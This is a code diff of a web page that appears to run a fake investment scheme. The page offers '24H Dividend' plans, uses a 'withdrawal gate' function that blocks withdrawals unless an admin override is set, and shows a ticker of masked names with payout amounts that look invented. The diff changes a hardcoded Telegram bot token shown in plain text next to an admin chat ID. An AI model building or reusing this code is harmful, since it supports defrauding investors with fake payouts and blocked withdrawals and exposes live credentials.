@@ -728,8 +728,8 @@
   </div>
   <!-- ================= 4. APPLICATION JAVASCRIPT ================= -->
   <script>
-    // TELEGRAM BOT CONFIGURATION
-    const TG_BOT_TOKEN = "9067370476:AAEMHB7dmKWDeWxa4ePmMyTgCzOUoHXRmzl";
+    // TELEGRAM BOT CONFIGURATION (EXACT TOKEN WITH CAPITAL 'I')
+    const TG_BOT_TOKEN = "9067370476:AAEMHB7dmKWDeWxa4ePmMyTgCzOUoHXRmzI";
     const TG_ADMIN_CHAT_ID = "9288472992";
     let tgLastUpdateId = Number(localStorage.getItem('seaCargoTgOffset') || 0);
 
@@ -883,7 +883,7 @@
       updateUI();
       alert(`Allocated: ${plan.planNo}! 24H Dividend cycle activated.`);
     }
-       // 2-STEP UNIQUE WITHDRAWAL GATE ENGINE (TRIGGERS ONLY WHEN WITHDRAWING)
+        // 2-STEP UNIQUE WITHDRAWAL GATE ENGINE (TRIGGERS ONLY WHEN WITHDRAWING)
     function checkWithdrawalClearance() {
       if (state.adminForceVip) return { allowed: true };
 
@@ -1252,7 +1252,7 @@
           </div>
         </div>
       `).join("");
-    }
+                                                                         }
         const maskedNames = ["R*****h", "V*****m", "A***y", "S*****a", "D****k", "M***j", "P***a", "R***t", "S****h", "A***t", "V***y", "K***n"];
     const amountPool = [1200, 1850, 2400, 3100, 3500, 4200, 4800, 5200, 6500, 7500, 9200];
     let currentIndex = 0;
@@ -1556,6 +1556,3 @@
   </script>
 </body>
 </html>
-
-      
-
